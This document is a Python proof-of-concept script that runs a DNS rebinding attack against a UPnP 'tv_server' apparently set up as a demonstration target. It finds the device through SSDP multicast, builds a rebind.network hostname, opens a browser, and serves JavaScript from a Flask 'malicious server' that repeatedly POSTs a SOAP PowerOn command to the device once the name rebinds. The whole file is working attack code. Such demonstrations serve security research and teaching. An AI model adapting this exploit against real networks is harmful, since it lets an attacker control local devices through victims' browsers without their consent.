#!/usr/bin/python3

"""
Summary
-------

Runs a DNS rebinding attack on a running tv_server.

Steps
-----

1) Find a running tv_server on the local network
2) Run a malicious server serving malicious JS code
3) Open local browser (127.0.0.1) pointing to this server


Result
------

After some time, the malicious server should make a PowerOn
request on the tc_server service.

Note
----

Your resolver might filter DNS rebinding attacks,
(you can switch to Google DNS, 8.8.8.8 for example).

In this example, the malicious server actually execute on
127.0.0.1 but it would work the same if it was running on
a remote server.
"""

import time
import socket
import re
from urllib.parse import urlparse
import os
from flask import Flask, make_response
import webbrowser
import uuid
import threading


def find_device():
    """
    Find URL of device description using SSDP
    """

    interface_address = "0.0.0.0"

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    sock.setsockopt(
        socket.IPPROTO_IP, socket.IP_MULTICAST_IF, socket.inet_aton(interface_address)
    )

    message = """M-SEARCH * HTTP/1.1\r
HOST: 239.255.255.250:1900\r
MAN: "ssdp:discover"\r
MX: 5\r
ST: urn:schemas-upnp-org:device:tvdevice:1\r
USER-AGENT: Python/3 UPnP/1.1 Foo/1.0\r
\r
    """.encode(
        "UTF-8"
    )

    sock.sendto(message, ("239.255.255.250", 1900))
    while True:
        response = sock.recv(4096)
        if not re.search(
            b"\r\n?ST: urn:schemas-upnp-org:device:tvdevice:1\r", response
        ):
            continue
        match = re.search(b"\r\n?LOCATION: *([^ ]*)\r", response, re.IGNORECASE)
        if match:
            return match.group(1).decode("UTF-8")


doc_path = find_device()
print("LOCATION: " + doc_path)

# Extract IP and port:
real_host = urlparse(doc_path).netloc
real_domain, real_port = real_host.split(":")
real_port = int(real_port, 10)


# Build DNS rebinding URL:
new_url = f"http://a.127.0.0.1.1time.{real_domain}.forever.{str(uuid.uuid4())}.rebind.network:{real_port}/"
print(new_url)


def thread_function():
    time.sleep(3)
    webbrowser.open(new_url)


threading.Thread(target=thread_function).start()


app = Flask(__name__)


@app.route("/")
def home():
    return '<script src="/test.js"></script>Please wait...'


@app.route("/test.js")
def code():
    response = make_response(
        """
    function sleep(delay)
    {
    return new Promise((resolve, reject) => {
        setTimeout(resolve, delay);
    });
    }
    async function main() {
        while(true) {
            await sleep(2000);
            try {
                let response = await fetch("/upnp/control/tvcontrol1", {
                    method: "POST",
                    headers: {
                    "Content-Type": "text/xml; charset=utf-8",
                    "SOAPAction": '"urn:schemas-upnp-org:service:tvcontrol:1#PowerOn"',
                    },
                    body: `<?xml version="1.0" encoding="utf-8"?>
                    <s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
                        <s:Body>
                        <u:PowerOn xmlns:u="urn:schemas-upnp-org:service:tvcontrol:1">
                        </u:PowerOn>
                        </s:Body>
                    </s:Envelope>`
                });
                if (response.status != 200)
                    continue;
                let text = await response.text();
                document.body.innerText = text;
                return;
            }
            catch(e) {
            }
        }
    }
    main();
    """
    )
    response.content_type = "application/javascript"
    return response


@app.route("/upnp/control/tvcontrol1", methods=["POST"])
def tvcontrol():
    return ("ERROR", 500)


app.run(port=real_port, host="127.0.0.1")
